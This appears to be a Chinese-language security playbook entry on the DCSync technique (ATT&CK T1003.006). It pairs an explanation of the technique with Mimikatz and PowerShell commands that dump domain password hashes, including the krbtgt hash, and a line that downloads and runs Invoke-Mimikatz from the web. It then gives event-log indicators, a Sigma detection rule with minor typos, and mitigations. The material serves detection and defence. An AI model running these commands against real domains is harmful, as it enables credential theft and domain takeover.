# T1003-006-windows-基于DCsync凭证获取

## 来自ATT&CK的描述

攻击者可能会通过滥用Windows域控制器的应用程序编程接口（API）来访问凭据和其他敏感信息，从而使用称为DCSync的技术来模拟来自远程域控制器的复制过程。

域控制器上的Administrators，Domain Admins和Enterprise Admin组或计算机帐户的成员能够运行DCSync来从Active Directory中提取密码数据，其中可能包括潜在有用帐户（例如KRBTGT和管理员。然后，这些散列又可以用于创建“黄金票证”，以用于“传递票证” 或更改“ 帐户操作”中所述的帐户密码。

DCSync功能已被列入“lsadump”模块中Mimikatz。Lsadump还包括NetSync，它通过旧版复制协议执行DCSync。

### DCsync

DCSync 是一种后期杀伤链攻击，允许攻击者模拟域控制器（DC）的行为，以便通过域复制检索密码数据。一旦攻击者可以访问具有域复制权限的特权帐户，攻击者就可以利用复制协议来模仿域控制器。

![img](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/uk1Q6x.png)

**DCSync**  本身是**Mimikatz**中的一个命令，  [它](https://github.com/gentilkiwi/mimikatz) 依赖于利用Microsoft目录复制服务远程协议（MS-DRSR）中的特定命令来模拟域控制器的行为，并要求其他域控制器使用[目录复制服务远程协议](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47)来复制信息  [（MS-DRSR）](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47)。利用这些协议，此攻击利用了Active Directory的有效和必要功能，无法关闭或禁用它们。

### DCsync攻击原理

一般来说，DCSYNC攻击的工作方式如下：

1. 发现域控制器以请求复制。
2. 使用[GetNCChanges](https://wiki.samba.org/index.php/DRSUAPI) 函数请求用户复制 。
3. DC将复制数据返回给请求者，包括密码哈希值。

![img](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/uk1ttH.gif)

DCSync的经典用例是作为[Golden Ticket](https://attack.stealthbits.com/how-golden-ticket-attack-works) 攻击的前身，因为它可用于检索KRBTGT HASH。

### 所需权限

值得注意的是，为了执行此攻击，需要一些非常特权的权限。这就是为什么这种攻击被归类为在杀伤链攻击的后期发生的原因，并且攻击者通常需要一些时间才能获得这些权限。

通常，管理员，域管理员，企业管理员拥有所需的权限，但更具体地说，需要以下权限：

- 复制目录更改
- 复制目录全部更改
- 在筛选集中复制目录更改

## 测试案例

DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash.

**利用条件：**

获得以下任一用户的权限：

- Administrators组内的用户
- Domain Admins组内的用户
- Enterprise Admins组内的用户
- 域控制器的计算机帐户

利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据

### 1.使用mimikatz

导出域内所有用户的hash：

```dos
mimikatz.exe privilege::debug "lsadump::dcsync /domain:abcc.org /all /csv" exit
```

导出域内administrator帐户的hash：

```dos
mimikatz.exe privilege::debug "lsadump::dcsync /domain:abcc.org /user:administrator /csv" exit
```

#### 2.powershell实现

通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能

导出域内所有用户的hash：

```powershell
Invoke-DCSync -DumpForest | ft -wrap -autosize
```

导出域内administrator帐户的hash：

```powershell
Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize
```

## 检测日志

windows 安全日志

## 测试复现

复现方法分为两类：本地、远程

### 场景:在本地运行DCsync,利用powershell脚本Invoke-Mimikatz

 在Windows域控服务器上启动powershell，然后下载Invoke-Mimikatz。

```powershell
iex (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
```

 完成后，我们可以使用以下命令运行DCSync。

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt /domain:0day.org"'
```

## 测试留痕

windows 安全日志，4662（在对象上已执行操作），特征值：*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2，控制访问*

## 检测规则/思路

DCSync是一个强大的工具，在红色团队成员手中，对于蓝色团队成员而言，这是一场噩梦。对于蓝队，一切都不会丢失。停止这种攻击可能不可行，但可以将其检测出来。

检测方法： 网络监控 、事件ID检测

### sigma规则

```yml
title: 在DCSync位置进行检测
description: windows server 2008 测试结果（域控本地）
references: https://yojimbosecurity.ninja/dcsync/
tags: T1003-006
status: experimental
author: 12306Bro
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662 #在对象上已执行操作。
        Operationtype: 'Obeject Access' #操作>操作类型
        Access: '访问控制' #操作>访问
        Properties:
             - '*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*'  #特征值 mimikatz导出域账户
             - '*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*'  #特征值 mimikatz导出administrator
             - ‘*89e95b76-444d-4c62-991a-0facbeda640c*’  #特征值
    condition: selection
level: medium
```

### 建议

暂无

## 缓解措施及临时性解决方案

免受DCSync攻击的最佳保护是控制负责允许帐户复制更改的域权限。不可避免地，某些用户将拥有此权利，因此应受到保护。

为避免将特权密码详细信息存储在攻击者可能会破坏它们的位置，应使用分层的登录协议来防止特权帐户登录到可以从内存中转储其密码哈希值并用于获取执行密码所需权限的服务器和工作站。

## 参考推荐

MITRE-ATT&CK-T1003-006

<https://attack.mitre.org/techniques/T1003/006>

什么是DCSYNC？一个介绍

<https://blog.stealthbits.com/what-is-dcsync/>

域渗透——DCSync

<https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/>

DCsync利用原理

<https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47>

powershell工具实现

<https://gist.github.com/monoxgas/9d238accd969550136db>

DCsysnc检测

<https://yojimbosecurity.ninja/dcsync/>

Active Directory复制

<https://github.com/hunters-forge/ThreatHunter-Playbook/blob/master/library/active_directory_replication.md>
